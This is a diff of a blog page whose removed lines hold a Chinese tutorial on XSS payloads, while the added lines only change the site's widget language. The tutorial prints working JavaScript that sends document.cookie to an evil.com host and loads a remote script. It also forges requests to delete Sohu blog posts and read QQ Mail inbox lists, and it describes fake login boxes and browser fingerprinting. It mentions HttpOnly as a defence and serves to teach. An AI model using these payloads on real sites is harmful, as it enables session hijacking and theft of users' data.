-<p>XSS Payload就是JavaScript脚本(还可以是Flash或其他富客户端的脚本)，所以任何Javascript脚本能做到的事情，XSS Payload都能做到。</p>
-<p>一个最常见的XSS Payload就是读取浏览器的Cookie对象，从而发起”Cookie劫持”攻击。</p>
-<p>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不用通过密码，而直接登录进用户的账户。</p>
-<p>如下所示，攻击者先加载一个远程脚本:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.a.com/test.htm?abc=”&gt;<span class="tag">&lt;<span class="name">script</span> <span class="attr">scr</span>=<span class="string">http://www.evil.com/evil.js</span> &gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>真正的XSS Payload现在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。</p>
-<p>在evil.js中，可以通过如下代码窃取Cookie:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var img=document.createElement(“img”);    创建一个img对象</div><div class="line"></div><div class="line">img.src=”http://www.evil.com/log?”+escape(document.cookie);</div><div class="line"></div><div class="line">document.body.appendChild(img);        将img对象插入到节点</div></pre></td></tr></table></figure>
-<p>这段代码在页面中插入了一张看不见的图片，同时把document.cookie对象作为参数发送到远程服务器。</p>
-<p>事实上，http: //www .evil.com/log  并不一定要存在，因为这个请求会在远程服务器的Web日志中留下记录。</p>
-<p>这样就完成了一个最简单的窃取Cookie的XSS Payload。</p>
-<p>黑客可以用这个Cookie直接登录。</p>
-<p>防止:Cookie的“HttpOnly”标识可以防止”Cookie劫持”，我们将在稍后的章节中在具体介绍。HttpOnly表明cookie存在于http层面，不能被客户端脚本读取</p>
-<p> 2)强大的XSS Payload:</p>
-<p>cookie劫持并非每次都有效，有的网站会在set-cookie时给关键cookie植入httponly标识，有的网站则会吧cookie与客户端ip绑定</p>
-<p>a)网站上的应用，只需要接受HTTP的GET POST请求，即可完成所有操作，那么可以通过javascript构造GET POST请求就可以让应用执行操作。</p>
-<p>例如在Sohu上有一篇文章， 想通过XSS删除它，该如何做呢?</p>
-<p>假设Sohu博客所在域的某页面存在XSS漏洞，那么通过JavaScript，这个过程如下:</p>
-<p>正常删除该文章的链接是:</p>
-<p><a href="http://inqiu.com/manage/entry.do?m=delete&amp;id=156713012" target="_blank" rel="external">http://inqiu.com/manage/entry.do?m=delete&amp;id=156713012</a></p>
-<p>对于攻击者来说，只需要直到文章的id，就能够通过这个请求删除这篇文章了。</p>
-<p>攻击者可以通过插入一张图片来发起一个get请求:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(“img”);</div><div class="line">img.scr=”http:<span class="comment">//blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012″;</span></div><div class="line"><span class="built_in">document</span>.body.appendChild(img);</div></pre></td></tr></table></figure>
-<p>攻击者只需要让博客的作者执行这段JavaScript代码(XSS Payload)，就会把这篇文章删除。在具体攻击中，攻击者将通过XSS诱使用户执行XSS Payload。</p>
-<p>如果网站应用者接受POST请求，那么攻击者如何实施XSS攻击呢?</p>
-<p>攻击者将通过Javascript发出一个post请求            在分析的过程中，可以先抓正常提交表单是的post包，然后构造</p>
-<p>第一种方法是构造一个form表单，然后自动提交这个表单:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> f=<span class="built_in">document</span>.createElement(“form”);</div><div class="line">f.action=””;</div><div class="line">f.method=”post”;</div><div class="line"><span class="built_in">document</span>.body.appendChild(f);</div><div class="line"></div><div class="line"><span class="keyword">var</span> i1=<span class="built_in">document</span>.createElement(“input”);</div><div class="line">i1.name=” ck”;</div><div class="line">i1.value=” JiuY”;</div><div class="line">f.appendChild(i1);</div><div class="line"></div><div class="line"><span class="keyword">var</span> i2=<span class="built_in">document</span>.createElement(“input”);</div><div class="line">i2.name=” mb_text”;</div><div class="line">i2.value=”testtestseset”;</div><div class="line">f.appendChild(i2);</div><div class="line"></div><div class="line">f.submit();</div></pre></td></tr></table></figure>
-<p>如果表单参数很多的话，通过构造DOM的方式，代码将会很冗长。所以可以直接写HTML代码:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">var dd=document.createElement(“div”);</div><div class="line">document.body.appendChild(dd);</div><div class="line">dd.innerHTML='&lt;form action=”” method=”post” id=”xssform” name=”mbform”&gt;’+</div><div class="line">‘&lt;input type=”hidden” name=”ck” value=”JiuY” /&gt;’+</div><div class="line">‘&lt;input type=”hidden” name=”mb_text” value=”testetst” /&gt;’ +</div><div class="line">‘&lt;/form&gt;’</div><div class="line"></div><div class="line">document.getElementById(“xssform”).submit();</div></pre></td></tr></table></figure>
-<p>第二种方法是，通过XMLHttpRequest发送一个POST请求:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> url=”http:<span class="comment">//www.douban.com”;</span></div><div class="line"><span class="keyword">var</span> postStr=”ck=JiuY&amp;mb_text=test1234″;</div><div class="line"><span class="keyword">var</span> ajax=<span class="literal">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)&#123;</div><div class="line">	ajax=<span class="keyword">new</span> XMLHttpRequest();</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject)&#123;</div><div class="line">	ajax=<span class="keyword">new</span> ActiveXObject(“Microsoft.XMLHTTP”);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ajax.open(“POST”,url,<span class="literal">true</span>);</div><div class="line">ajax.setRequestHeader(“Content-Type”,”application/x-www-form-urlencoded”);</div><div class="line">ajax.send(postStr);</div><div class="line"></div><div class="line">ajax.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span> (ajax.readyState==<span class="number">4</span> &amp;&amp; ajax.status==<span class="number">200</span>)&#123;</div><div class="line">  	alert(“Done”);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>可以看出，在XSS攻击后，除了可以实施cookie劫持外，还能够通过模拟GET POST请求操纵用户的浏览器。</p>
-<p>下面的例子将演示如何通过XSS Payload读取QMail用户的邮件文件夹:</p>
-<p>首先看看正常的请求是如何获取到所有的邮件列表的。登录邮箱后，点击“收件箱”后。抓包发现浏览器发出了如下请求:</p>
-<p><a href="http://m57.mail.qq.com/cgi-bing/mail_list?sid=6a1hx3p5yzh…&amp;folderid=1&amp;page=0&amp;s=index&amp;loc=folderlist,,,1" target="_blank" rel="external">http://m57.mail.qq.com/cgi-bing/mail_list?sid=6a1hx3p5yzh…&amp;folderid=1&amp;page=0&amp;s=index&amp;loc=folderlist,,,1</a></p>
-<p>经过分析，真正能访问到邮件列表的链接是:</p>
-<p><a href="http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&amp;page=0&amp;s=inbox&amp;sid=6a1hx…" target="_blank" rel="external">http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&amp;page=0&amp;s=inbox&amp;sid=6a1hx…</a></p>
-<p>这里有一个无法直接构造出的值:sid。从字面推测，这个sid参数应该是用户ID加密后的值。</p>
-<p>所以XSS Payload的思路是先获取到sid的值，然后构造完整的URL，并使用XMLHttpRequest请求到此URL，应该就能得到邮件列表了。XSS Payload如下:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (top.window.location.href.indexOf(“sid=”)&gt;<span class="number">0</span>)&#123;</div><div class="line">	<span class="keyword">var</span> sid=top.window..location.href.substr(top.window.location.href.indexOf(“sid=”)+<span class="number">4</span>,<span class="number">24</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> folder_url=”http:<span class="comment">//”+top.window.location.host+”/cgi-bin/mail_list?folderid=1&amp;page=0&amp;s=inbox&amp;sid=”+sid;</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> ajax=<span class="literal">null</span>;</div><div class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)&#123;</div><div class="line">	ajax=<span class="keyword">new</span> XMLHttpRequest();</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject)&#123;</div><div class="line">	ajax=<span class="keyword">new</span> ActiveXObject(“Microsoft.XMLHTTP”);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">	<span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ajax.open(“GET”,folder_url,<span class="literal">true</span>);</div><div class="line">ajax.send(<span class="literal">null</span>);</div><div class="line"></div><div class="line">ajax.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span> (ajax.readyState==<span class="number">4</span> &amp;&amp; ajax.status==<span class="number">200</span>)&#123;</div><div class="line">	  alert(ajax.responseText);</div><div class="line">	  <span class="comment">//document.write(ajax.responseText);</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>邮件列表的内容成功被XSS Payload获取到。</p>
-<p>b)钓鱼:</p>
-<p>XSS并非万能。前面的例子都是Javascript脚本，缺少”与用户的交互”,碰到验证码，和修改密码时需要输入旧密码，XSS Payload就会失效。</p>
-<p>对于验证码，XSS Payload可以读取页面的内容，将验证码的图片URL发送到远程服务器上来实施–攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。</p>
-<p>修改密码的问题比较复杂，为了窃取密码，攻击者可以将XSS与”钓鱼”结合。</p>
-<p>实现思路很简单:利用Javascript在当前页面上”画出”一个伪造的登录框，当用户在登录框中输入用户名和密码后，其密码将被发送到黑客的服务器上。</p>
-<p>c)识别用户浏览器:</p>
-<p>通过识别用户的浏览器、操作系统就可以执行一次精准的内存攻击</p>
-<p>可以通过javascript脚本识别浏览器版本：</p>
-<p>1，通过XSS读取浏览器的UserAgent对象：alert(navigator.userAgent);<br>但是userAgent是可以伪造的。这个信息不一定准确。</p>
-<p>2，由于浏览器之间的实现存在差异，利用这种差异分辨浏览器几乎不会错误。<br>通过如下代码；</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">B=(<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>)</span>&#123;&#125;)[<span class="number">-5</span>]==’x’?’FF3′:(<span class="function"><span class="keyword">function</span></span></div><div class="line"><span class="title">x</span>(<span class="params"></span>)&#123;&#125;)[<span class="number">-6</span>]==’x’?’FF2′:<span class="regexp">/a/</span>[<span class="number">-1</span>]==’a’?’FF’:’\v’==’v’?’IE’:<span class="regexp">/a/</span>.__proto__==’<span class="comment">//’?’Saf’:/s/.</span></div><div class="line">test(<span class="regexp">/a/</span>.toString)?’Chr’:<span class="regexp">/^function \(/</span>.test[].sort)?’Op’:’Unknow’</div></pre></td></tr></table></figure>
-<p>3，识别用户安装的软件:<br>在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。这种方法很早就被用于“挂马攻击”–黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。<br>看如下代码:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">	<span class="keyword">var</span> Obj=<span class="keyword">new</span> ActiveXObject(‘XunLeiBHO.ThunderIEHelper’);</div><div class="line">&#125; <span class="keyword">catch</span> (e)&#123;</div><div class="line">	<span class="comment">//异常了，不存在该控件</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本。</p>
-<p>一些第三方软件也可能会泄漏一些信息。比如Flash有一个system.capabilities对象，能够查询客户端电脑中的硬件信息。</p>
-<p>在XSS Payload中，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过ExternalInterface传给页面的javascript。</p>
-<p>Firefox的插件(Plugins)列表存放在一个DOM对象中，通过查询DOM可以遍历出所有的插件:</p>
-<p>所以直接查询”navigator.plugins”对象，就能找到所有的插件了。例如 navigator.plugins[0]</p>
-<p>Firefox的扩展(extension)：通过检测扩展的图标，来判断某个特定的扩展是否存在。</p>
-<p>在firefox中有一个特殊的协议: chrome:// ，Chrome的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问:</p>
-<p>chrome://flashgot/skin/icon32.png</p>
-<p>扫描firefox扩展时，只需在Javascript中加载这张图片，如果加载成功，则扩展存在；反之，扩展就不存在。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> m=<span class="keyword">new</span> Image();</div><div class="line">m.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	alert(<span class="number">1</span>);<span class="comment">//图片存在</span></div><div class="line">&#125;;</div><div class="line">m.onerror=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	alert(<span class="number">2</span>);<span class="comment">//图片不存在</span></div><div class="line">&#125;;</div><div class="line">m.src=”chrome:<span class="comment">//flashgot/skin/icon32.png”; //连接图片</span></div></pre></td></tr></table></figure>
-<p> 4，CSS History Hack:</p>
-<p>另一种XSS Payload—通过CSS，来发现一个用户曾经访问过的网站。</p>
-<p>原理是利用style的visited属性—如果用户曾经访问过某个链接，那么这个链接的颜色会变的与众不同。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;body&gt;</div><div class="line">&lt;a href=# &gt;曾经访问过&lt;/a&gt;</div><div class="line">&lt;a href=”notexist”&gt;未曾经访问过&lt;/a&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
-<p>往上存在利用POC，firefox已经修补了这个漏洞</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://dodoing.com/2016/11/18/带你玩转跨站脚本攻击cross site script.html" data-id="cj4ruszv4001fv0e9up4z9rxd" class="article-share-link">Partager</a>
+      <a data-url="http://dodoing.com/2016/11/22/js的执行过程，预解析与执行.html" data-id="cj4t5x1eb000myke9ykn3toes" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li></ul>
@@ -521,9 +506,9 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Mot-clés</h3>
+    <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript-node-js-mongo/">javascript node.js mongo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript-node-js-redis/">javascript node.js redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/攻击与防御/">攻击与防御</a></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript-node-js-mongo/">javascript node.js mongo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js-angular-react-vue/">js angular react vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js-node-js-redis/">js node.js redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/攻击与防御/">攻击与防御</a></li></ul>
     </div>
   </div>
 
@@ -531,9 +516,9 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Nuage de mot-clés</h3>
+    <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/css/" style="font-size: 13.33px;">css</a> <a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/javascript/" style="font-size: 20px;">javascript</a> <a href="/tags/javascript-node-js-mongo/" style="font-size: 10px;">javascript node.js mongo</a> <a href="/tags/javascript-node-js-redis/" style="font-size: 10px;">javascript node.js redis</a> <a href="/tags/js/" style="font-size: 16.67px;">js</a> <a href="/tags/nginx/" style="font-size: 10px;">nginx</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a> <a href="/tags/攻击与防御/" style="font-size: 10px;">攻击与防御</a>
+      <a href="/tags/css/" style="font-size: 13.33px;">css</a> <a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/javascript/" style="font-size: 20px;">javascript</a> <a href="/tags/javascript-node-js-mongo/" style="font-size: 10px;">javascript node.js mongo</a> <a href="/tags/js/" style="font-size: 16.67px;">js</a> <a href="/tags/js-angular-react-vue/" style="font-size: 10px;">js angular react vue</a> <a href="/tags/js-node-js-redis/" style="font-size: 10px;">js node.js redis</a> <a href="/tags/nginx/" style="font-size: 10px;">nginx</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a> <a href="/tags/攻击与防御/" style="font-size: 10px;">攻击与防御</a>
     </div>
   </div>
 
@@ -550,12 +535,16 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Articles récents</h3>
+    <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
         
           <li>
-            <a href="/2017/07/06/了解http.html">了解http</a>
+            <a href="/2017/07/10/了解angular1、angular2+，vue，react.html">了解angular1、angular2+，vue，react</a>
+          </li>
+        
+          <li>
+            <a href="/2017/07/06/了解http.html">了解http、https、http1、http2</a>
           </li>
         
           <li>
@@ -568,10 +557,6 @@
         
           <li>
             <a href="/2017/06/15/彻底理解透彻js的原型与原型链.html">彻底理解透彻js的原型与原型链</a>
-          </li>
-        
-          <li>
-            <a href="/2017/06/15/hello-world.html">Hello World</a>
           </li>
         
       </ul>
@@ -587,7 +572,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2017 eoeos<br>
-      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
